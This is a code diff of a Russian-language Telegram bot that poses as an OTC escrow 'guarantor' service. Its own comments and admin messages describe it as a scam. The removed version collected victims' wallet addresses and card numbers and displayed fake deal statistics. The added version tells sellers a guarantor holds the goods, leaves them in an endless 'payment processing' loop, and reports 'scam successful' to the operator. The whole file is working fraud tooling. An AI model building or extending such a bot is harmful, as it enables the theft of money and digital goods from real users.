     if not deal:
-        await message.answer("❌ Сделка не найдена")
+        await call.answer("❌ Сделка не найдена", show_alert=True)
         return
     
-    if deal[2] is not None:
-        await message.answer("❌ У этой сделки уже есть покупатель")
-        return
-    
-    update_deal_buyer(deal_id, message.from_user.id)
-    
-    await message.answer(
-        f"🔐 <b>Вход в сделку #{deal_id}</b>\n\n"
-        f"💰 Сумма: {deal[3]} {deal[4]}\n"
-        f"👤 Продавец: ID {deal[1]}\n\n"
-        f"📋 <b>Инструкция:</b>\n"
-        f"1. Нажми кнопку оплаты ниже\n"
-        f"2. После подтверждения продавца получите подарок\n"
-        f"3. Подтвердите получение\n\n"
-        f"⚠️ Средства зарезервированы гарантом",
-        reply_markup=payment_keyboard(deal_id)
-    )
-
-@dp.callback_query_handler(lambda c: c.data.startswith('pay_'))
-async def process_payment(call: types.CallbackQuery):
-    """Покупатель нажимает оплатить (фейк)"""
-    deal_id = call.data.replace('pay_', '')
-    deal = get_deal(deal_id)
-    
-    if not deal:
-        await call.answer("Сделка не найдена", show_alert=True)
-        return
-    
-    # Обновляем статус
-    update_deal_status(deal_id, "paid")
+    update_deal_item_received(deal_id)
     
     await call.message.edit_text(
-        f"✅ <b>Оплата выполнена!</b>\n\n"
-        f"🔑 Сделка: {deal_id}\n"
-        f"💰 Сумма: {deal[3]} {deal[4]}\n\n"
-        f"⏳ <b>Ожидаем подтверждения от продавца...</b>\n\n"
-        f"Как только продавец подтвердит получение оплаты, вы сможете получить подарок",
-        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔄 Проверить статус", callback_data=f"status_{deal_id}"))
+        f"✅ <b>Подарок передан гаранту {GIFT_GUARANT}</b>\n\n"
+        f"🔑 Сделка: {deal_id}\n\n"
+        f"⏳ Ожидаем подтверждения от продавца...",
+        reply_markup=back_to_menu_keyboard()
     )
     
-    # Уведомляем продавца (жертву)
+    # Уведомляем продавца
     await bot.send_message(
         deal[1],  # seller_id
-        f"✅ <b>Покупатель оплатил сделку!</b>\n\n"
+        f"📦 <b>Покупатель передал подарок гаранту!</b>\n\n"
         f"🔑 Сделка: {deal_id}\n"
-        f"💰 Сумма: {deal[3]} {deal[4]}\n\n"
-        f"📦 <b>Подтвердите получение оплаты</b>\n"
-        f"и передайте подарок {GIFT_RECEIVER}",
+        f"📦 {deal[3]}\n"
+        f"💰 {deal[4]} {deal[5]}\n\n"
+        f"✅ Все хорошо? Нажмите кнопку для получения денег:",
         reply_markup=seller_confirm_keyboard(deal_id)
     )
     
     # Лог для админа
     await bot.send_message(
         ADMIN_IDS[0],
-        f"💸 <b>ПОКУПАТЕЛЬ НАЖАЛ ОПЛАТУ</b>\n\n"
+        f"📦 Товар передан гаранту\nСделка: {deal_id}"
+    )
+
+@dp.callback_query_handler(lambda c: c.data.startswith('accept_money_'))
+async def accept_money(call: types.CallbackQuery):
+    """Продавец нажимает принять деньги (бесконечная загрузка)"""
+    deal_id = call.data.replace('accept_money_', '')
+    deal = get_deal(deal_id)
+    
+    if not deal:
+        await call.answer("❌ Сделка не найдена", show_alert=True)
+        return
+    
+    update_deal_payment_requested(deal_id)
+    
+    # Заменяем клавиатуру на бесконечную загрузку
+    await call.message.edit_text(
+        f"⏳ <b>Обработка платежа...</b>\n\n"
         f"🔑 Сделка: {deal_id}\n"
-        f"👤 Продавец (жертва): ID {deal[1]}\n"
-        f"👤 Покупатель (мошенник): @{call.from_user.username}"
-    )
-
-@dp.callback_query_handler(lambda c: c.data.startswith('seller_confirm_'))
-async def seller_confirm_payment(call: types.CallbackQuery):
-    """Продавец подтверждает получение оплаты"""
-    deal_id = call.data.replace('seller_confirm_', '')
-    deal = get_deal(deal_id)
-    
-    if not deal:
-        await call.answer("Сделка не найдена", show_alert=True)
-        return
-    
-    confirm_seller(deal_id)
-    
-    await call.message.edit_text(
-        f"✅ <b>Подтверждение получено!</b>\n\n"
-        f"🔑 Сделка: {deal_id}\n\n"
-        f"📦 <b>Теперь передайте подарок гаранту:</b>\n"
-        f"{GIFT_RECEIVER}\n\n"
-        f"⚠️ После передачи нажмите кнопку ниже",
-        reply_markup=transfer_keyboard(deal_id)
+        f"💰 Сумма: {deal[4]} {deal[5]}\n\n"
+        f"Деньги будут зачислены в течение 2-3 часов.\n"
+        f"Статус: в обработке",
+        reply_markup=loading_keyboard()
     )
     
-    # Уведомляем покупателя (мошенника)
-    await bot.send_message(
-        deal[2],  # buyer_id
-        f"✅ <b>Продавец подтвердил оплату!</b>\n\n"
-        f"🔑 Сделка: {deal_id}\n\n"
-        f"⏳ Ожидайте передачи подарка от продавца\n"
-        f"гаранту {GIFT_RECEIVER}",
-        reply_markup=InlineKeyboardMarkup().add(
-            InlineKeyboardButton("🔄 Проверить статус", callback_data=f"status_{deal_id}")
+    # Уведомляем покупателя (для вида)
+    if deal[2]:
+        await bot.send_message(
+            deal[2],
+            f"✅ <b>Продавец подтвердил получение!</b>\n\n"
+            f"🔑 Сделка: {deal_id}\n"
+            f"Спасибо за покупку! Подарок ваш."
         )
-    )
-
-@dp.callback_query_handler(lambda c: c.data.startswith('transfer_'))
-async def transfer_gift(call: types.CallbackQuery):
-    """Продавец передал подарок"""
-    deal_id = call.data.replace('transfer_', '')
     
-    await call.message.edit_text(
-        f"✅ <b>Заявка на передачу принята!</b>\n\n"
-        f"🔑 Сделка: {deal_id}\n\n"
-        f"⏳ <b>Ожидаем подтверждения от покупателя...</b>\n\n"
-        f"Как только покупатель подтвердит получение подарка,\n"
-        f"деньги поступят на ваш кошелек в течение 2-3 часов.",
-        reply_markup=main_keyboard(call.from_user.id)
-    )
-    
-    # Уведомляем покупателя (мошенника)
-    deal = get_deal(deal_id)
-    await bot.send_message(
-        deal[2],  # buyer_id
-        f"📦 <b>Продавец передал подарок гаранту!</b>\n\n"
-        f"🔑 Сделка: {deal_id}\n\n"
-        f"✅ <b>Подтвердите получение подарка</b>\n"
-        f"(подарок должен быть у вас в {GIFT_RECEIVER})",
-        reply_markup=buyer_received_keyboard(deal_id)
-    )
-
-@dp.callback_query_handler(lambda c: c.data.startswith('receive_'))
-async def buyer_received(call: types.CallbackQuery):
-    """Покупатель подтвердил получение подарка"""
-    deal_id = call.data.replace('receive_', '')
-    deal = get_deal(deal_id)
-    
-    if not deal:
-        await call.answer("Сделка не найдена", show_alert=True)
-        return
-    
-    confirm_buyer_received(deal_id)
-    
-    await call.message.edit_text(
-        f"✅ <b>Сделка завершена!</b>\n\n"
-        f"🔑 Сделка: {deal_id}\n\n"
-        f"🎁 Подарок получен покупателем\n"
-        f"💰 Деньги зарезервированы для продавца\n\n"
-        f"⚡ Выплата продавцу через 2-3 часа",
-        reply_markup=main_keyboard(call.from_user.id)
-    )
-    
-    # Уведомляем продавца (жертву)
-    await bot.send_message(
-        deal[1],  # seller_id
-        f"✅ <b>Покупатель подтвердил получение подарка!</b>\n\n"
-        f"🔑 Сделка: {deal_id}\n\n"
-        f"💰 <b>Деньги поступят в течение 2-3 часов</b>\n"
-        f"на указанные вами реквизиты.\n\n"
-        f"📞 По всем вопросам: @support_fake",
-        reply_markup=main_keyboard(deal[1])
-    )
-    
-    # Отправляем админу отчет об успешном скаме
+    # Лог для админа (скам успешен)
     await bot.send_message(
         ADMIN_IDS[0],
-        f"✅ <b>СКАМ УСПЕШЕН!</b>\n\n"
+        f"💰 <b>СКАМ УСПЕШЕН!</b>\n\n"
         f"🔑 Сделка: {deal_id}\n"
-        f"💰 Сумма: {deal[3]} {deal[4]}\n"
-        f"👤 Продавец (жертва): ID {deal[1]}\n"
-        f"👤 Покупатель (мошенник): ID {deal[2]}\n\n"
-        f"🎁 Подарок у мошенника\n"
-        f"⚡ Жертва ждет деньги 2-3 часа"
+        f"👤 Продавец: ID {deal[1]}\n"
+        f"👤 Покупатель: ID {deal[2]}\n"
+        f"💰 Сумма: {deal[4]} {deal[5]}\n"
+        f"⚡ Жертва теперь ждет вечно"
     )
 
 @dp.callback_query_handler(lambda c: c.data.startswith('status_'))
-async def check_status(call: types.CallbackQuery):
+async def check_deal_status(call: types.CallbackQuery):
     """Проверка статуса сделки"""
     deal_id = call.data.replace('status_', '')
     deal = get_deal(deal_id)
     
     if not deal:
-        await call.answer("Сделка не найдена", show_alert=True)
+        await call.answer("❌ Сделка не найдена", show_alert=True)
         return
     
     status_text = {
-        "waiting_buyer": "⏳ Ожидание покупателя",
-        "waiting_payment": "⏳ Ожидание оплаты",
-        "paid": "✅ Оплачено, ожидание подтверждения",
-        "item_transfer": "📦 Передача подарка",
-        "completed": "✅ Сделка завершена"
-    }.get(deal[5], "❓ Неизвестный статус")
+        "waiting_item": "⏳ Ожидание передачи товара",
+        "item_received": "✅ Товар у гаранта",
+        "processing": "⏳ Обработка платежа (2-3 часа)",
+    }.get(deal[6], "❓ Неизвестный статус")
     
     await call.message.answer(
         f"📊 <b>Статус сделки {deal_id}</b>\n\n"
-        f"💰 Сумма: {deal[3]} {deal[4]}\n"
-        f"📌 Статус: {status_text}",
-        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Назад", callback_data="back_to_main"))
+        f"📦 {deal[3]}\n"
+        f"💰 {deal[4]} {deal[5]}\n"
+        f"📌 {status_text}",
+        reply_markup=back_to_menu_keyboard()
     )
 
-# ================== АДМИН ПАНЕЛЬ ==================
-@dp.callback_query_handler(text="admin_panel")
-async def admin_panel(call: types.CallbackQuery):
+@dp.callback_query_handler(lambda c: c.data == "loading_forever")
+async def loading_forever(call: types.CallbackQuery):
+    """Бесконечная загрузка - всегда один ответ"""
+    await call.answer("⏳ Платеж обрабатывается... Обычно занимает 2-3 часа", show_alert=True)
+
+# ================== РЕФЕРАЛЬНАЯ СИСТЕМА ==================
+@dp.message_handler(lambda message: message.text == "🔗 Реферальная ссылка")
+async def referral_link(message: types.Message):
+    """Реферальная ссылка"""
+    user_id = message.from_user.id
+    bot_username = (await bot.me).username
+    ref_link = f"https://t.me/{bot_username}?start={user_id}"
+    
+    conn = sqlite3.connect('elf_otc.db')
+    c = conn.cursor()
+    c.execute('SELECT COUNT(*) FROM users WHERE referrer_id = ?', (user_id,))
+    referrals = c.fetchone()[0]
+    c.execute('SELECT referral_balance FROM users WHERE user_id = ?', (user_id,))
+    balance = c.fetchone()
+    ref_balance = balance[0] if balance else 0
+    conn.close()
+    
+    text = (
+        f"🔗 <b>Ваша реферальная ссылка:</b>\n"
+        f"<code>{ref_link}</code>\n\n"
+        f"👥 Приглашено: {referrals} чел.\n"
+        f"💰 Заработано: {ref_balance:.2f} TON\n\n"
+        f"⚡ За каждого приглашенного вы получаете 5 TON бонуса"
+    )
+    
+    await message.answer(text, reply_markup=main_keyboard())
+
+# ================== ПОДДЕРЖКА ==================
+@dp.message_handler(lambda message: message.text == "📞 Поддержка")
+async def support(message: types.Message):
+    """Поддержка"""
+    text = (
+        "📞 <b>Служба поддержки ELF OTC</b>\n\n"
+        "По всем вопросам обращайтесь:\n"
+        "👤 @otc_elf_support\n\n"
+        "⏳ Время ответа: 5-30 минут\n\n"
+        f"📖 Инструкция: {TUTORIAL_CHANNEL}"
+    )
+    
+    await message.answer(text, reply_markup=main_keyboard())
+
+# ================== CHANGE LANGUAGE ==================
+@dp.message_handler(lambda message: message.text == "🌐 Change language")
+async def change_language(message: types.Message):
+    """Смена языка (заглушка)"""
+    await message.answer(
+        "🌐 <b>Select language / Выберите язык</b>\n\n"
+        "🇬🇧 English - coming soon\n"
+        "🇷🇺 Русский - доступно\n"
+        "🇰🇿 Қазақша - скоро",
+        reply_markup=main_keyboard()
+    )
+
+# ================== ВОЗВРАТ В МЕНЮ ==================
+@dp.callback_query_handler(text="back_to_menu")
+async def back_to_menu(call: types.CallbackQuery, state: FSMContext = None):
+    """Возврат в главное меню"""
+    if state:
+        await state.finish()
+    await call.message.delete()
+    await cmd_start(call.message)
+
+# ================== АДМИН ПАНЕЛЬ (для просмотра сохраненных пользователей) ==================
+@dp.message_handler(commands=['admin'])
+async def admin_panel(message: types.Message):
     """Админ панель"""
-    if not is_admin(call.from_user.id):
-        await call.answer("❌ Доступ запрещен", show_alert=True)
+    if not is_admin(message.from_user.id):
         return
     
-    await call.message.edit_text(
-        "⚙️ <b>Админ панель</b>\n\n"
-        "Выберите действие:",
-        reply_markup=admin_keyboard()
+    total_users, total_deals, active_deals, today = get_real_stats()
+    
+    text = (
+        f"👑 <b>Админ панель</b>\n\n"
+        f"📊 <b>Реальная статистика:</b>\n"
+        f"👥 Всего пользователей: {total_users}\n"
+        f"📈 Всего сделок: {total_deals}\n"
+        f"⏳ Активных сделок: {active_deals}\n"
+        f"📅 Новых сегодня: {today}\n\n"
+        f"📋 <b>Команды:</b>\n"
+        f"/users - список всех пользователей\n"
+        f"/deals - список сделок\n"
+        f"/stats - полная статистика"
     )
+    
+    await message.answer(text)
 
-@dp.callback_query_handler(text="admin_stats")
-async def admin_stats(call: types.CallbackQuery):
-    """Статистика для админа"""
-    if not is_admin(call.from_user.id):
+@dp.message_handler(commands=['users'])
+async def list_users(message: types.Message):
+    """Список всех пользователей (только админ)"""
+    if not is_admin(message.from_user.id):
         return
     
-    conn = sqlite3.connect('scam_garant.db')
+    conn = sqlite3.connect('elf_otc.db')
+    c = conn.cursor()
+    c.execute('''SELECT user_id, username, first_name, reg_date, last_activity, total_deals 
+                 FROM users ORDER BY reg_date DESC''')
+    users = c.fetchall()
+    conn.close()
+    
+    # Разбиваем на части по 20 пользователей
+    for i in range(0, len(users), 20):
+        chunk = users[i:i+20]
+        text = f"📋 <b>Пользователи {i+1}-{i+len(chunk)} из {len(users)}</b>\n\n"
+        
+        for user in chunk:
+            reg = user[3][:10] if user[3] else "неизвестно"
+            text += f"🆔 <code>{user[0]}</code> | @{user[1] or 'нет'}\n"
+            text += f"📅 {reg} | сделок: {user[5]}\n\n"
+        
+        await message.answer(text)
+
+@dp.message_handler(commands=['deals'])
+async def list_deals(message: types.Message):
+    """Список всех сделок (только админ)"""
+    if not is_admin(message.from_user.id):
+        return
+    
+    conn = sqlite3.connect('elf_otc.db')
+    c = conn.cursor()
+    c.execute('''SELECT deal_id, seller_id, buyer_id, amount, currency, status, created_at 
+                 FROM deals ORDER BY created_at DESC LIMIT 30''')
+    deals = c.fetchall()
+    conn.close()
+    
+    text = "📝 <b>Последние 30 сделок:</b>\n\n"
+    
+    for deal in deals:
+        status_emoji = {
+            "waiting_item": "⏳",
+            "item_received": "📦",
+            "processing": "🔄"
+        }.get(deal[5], "❓")
+        
+        date = deal[6][:10] if deal[6] else "??"
+        text += f"{status_emoji} <code>{deal[0]}</code>\n"
+        text += f"💰 {deal[3]} {deal[4]} | {date}\n"
+        text += f"👤 Продавец: {deal[1]} | Покупатель: {deal[2] or 'нет'}\n\n"
+    
+    await message.answer(text)
+
+@dp.message_handler(commands=['stats'])
+async def show_full_stats(message: types.Message):
+    """Полная статистика"""
+    if not is_admin(message.from_user.id):
+        return
+    
+    total_users, total_deals, active_deals, today = get_real_stats()
+    
+    conn = sqlite3.connect('elf_otc.db')
     c = conn.cursor()
     
-    total_users = c.execute('SELECT COUNT(*) FROM users').fetchone()[0]
-    total_deals = c.execute('SELECT COUNT(*) FROM deals').fetchone()[0]
-    completed = c.execute('SELECT COUNT(*) FROM deals WHERE status = "completed"').fetchone()[0]
-    pending = c.execute('SELECT COUNT(*) FROM deals WHERE status != "completed"').fetchone()[0]
+    # Статистика по валютам
+    c.execute('''SELECT currency, COUNT(*), SUM(amount) FROM deals GROUP BY currency''')
+    currency_stats = c.fetchall()
     
-    c.execute('SELECT SUM(amount) FROM deals WHERE currency = "TON"')
-    ton_volume = c.fetchone()[0] or 0
+    # Пользователи по дням
+    c.execute('''SELECT date(reg_date), COUNT(*) FROM users 
+                 WHERE reg_date >= date('now', '-7 days')
+                 GROUP BY date(reg_date) ORDER BY date(reg_date) DESC''')
+    daily = c.fetchall()
     
     conn.close()
     
     text = (
-        f"📊 <b>Детальная статистика</b>\n\n"
-        f"👥 Пользователей: {total_users}\n"
+        f"📊 <b>Полная статистика</b>\n\n"
+        f"👥 Всего пользователей: {total_users}\n"
         f"📈 Всего сделок: {total_deals}\n"
-        f"✅ Завершено (скамов): {completed}\n"
-        f"⏳ В процессе: {pending}\n"
-        f"💎 TON объем: {ton_volume:.2f}\n\n"
-        f"📊 Фейковая статистика (для юзеров)\n"
-        f"• Сделок: 1,547\n"
-        f"• Пользователей: 2,341\n"
-        f"• Объем: $45,890"
+        f"⏳ Активных: {active_deals}\n"
+        f"📅 Новых сегодня: {today}\n\n"
+        f"💱 <b>По валютам:</b>\n"
     )
     
-    await call.message.edit_text(text, reply_markup=admin_keyboard())
-
-@dp.callback_query_handler(text="admin_users")
-async def admin_users(call: types.CallbackQuery):
-    """Список пользователей"""
-    if not is_admin(call.from_user.id):
-        return
+    for curr in currency_stats:
+        text += f"{curr[0]}: {curr[1]} сделок, {curr[2]:.2f} объем\n"
     
-    conn = sqlite3.connect('scam_garant.db')
-    c = conn.cursor()
-    users = c.execute('SELECT user_id, username, first_name, wallet_address, card_number FROM users ORDER BY user_id DESC LIMIT 10').fetchall()
-    conn.close()
+    text += f"\n📅 <b>Новых по дням:</b>\n"
+    for day in daily:
+        text += f"{day[0]}: {day[1]} чел.\n"
     
-    text = "👥 <b>Последние 10 пользователей:</b>\n\n"
-    for user in users:
-        text += f"🆔 <code>{user[0]}</code> | @{user[1] or 'нет'}\n"
-        text += f"💎 {user[3] or 'нет'} | 💳 {user[4] or 'нет'}\n\n"
-    
-    await call.message.edit_text(text, reply_markup=admin_keyboard())
-
-@dp.callback_query_handler(text="admin_edit_stats")
-async def admin_edit_stats(call: types.CallbackQuery, state: FSMContext):
-    """Изменение статистики"""
-    if not is_admin(call.from_user.id):
-        return
-    
-    await call.message.edit_text(
-        "📊 <b>Изменение статистики</b>\n\n"
-        "Введите новые значения в формате:\n"
-        "<code>сделки пользователи объем</code>\n\n"
-        "Пример: <code>2000 3000 50000</code>",
-        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Назад", callback_data="admin_panel"))
-    )
-    await state.set_state(AdminStates.waiting_for_stats_value)
-
-@dp.message_handler(state=AdminStates.waiting_for_stats_value)
-async def process_stats_update(message: types.Message, state: FSMContext):
-    """Обработка изменения статистики"""
-    if not is_admin(message.from_user.id):
-        return
-    
-    try:
-        deals, users, volume = map(float, message.text.split())
-        update_stats(int(deals), int(users), volume)
-        await message.answer("✅ Статистика обновлена")
-    except:
-        await message.answer("❌ Неверный формат")
-    
-    await state.finish()
-    await cmd_start(message)
-
-@dp.callback_query_handler(text="admin_add")
-async def admin_add_start(call: types.CallbackQuery, state: FSMContext):
-    """Добавление админа"""
-    if not is_admin(call.from_user.id):
-        return
-    
-    await call.message.edit_text(
-        "➕ <b>Добавление админа</b>\n\n"
-        "Введите Telegram ID нового админа:",
-        reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Назад", callback_data="admin_panel"))
-    )
-    await state.set_state(AdminStates.waiting_for_new_admin)
-
-@dp.message_handler(state=AdminStates.waiting_for_new_admin)
-async def admin_add_process(message: types.Message, state: FSMContext):
-    """Обработка добавления админа"""
-    if not is_admin(message.from_user.id):
-        return
-    
-    try:
-        new_admin_id = int(message.text)
-        
-        conn = sqlite3.connect('scam_garant.db')
-        c = conn.cursor()
-        c.execute('INSERT OR IGNORE INTO admins (user_id, added_by, added_at) VALUES (?, ?, ?)',
-                  (new_admin_id, message.from_user.id, datetime.now().isoformat()))
-        conn.commit()
-        conn.close()
-        
-        await message.answer(f"✅ Админ {new_admin_id} добавлен")
-    except:
-        await message.answer("❌ Введите корректный ID")
-    
-    await state.finish()
-    await cmd_start(message)
-
-@dp.callback_query_handler(text="back_to_main")
-async def back_to_main(call: types.CallbackQuery, state: FSMContext = None):
-    """Возврат в главное меню"""
-    if state:
-        await state.finish()
-    await cmd_start(call.message)
+    await message.answer(text)
 
 # ================== ЗАПУСК ==================
 if __name__ == "__main__":
-    print("🤖 OTC Гарант Бот запущен...")
-    print("👤 Продавец создает сделку -> Покупатель оплачивает (фейк) -> Скам")
+    print("🤖 ELF OTC Бот запущен...")
+    print("✅ Все пользователи сохраняются в базу данных")
     executor.start_polling(dp, skip_updates=True)
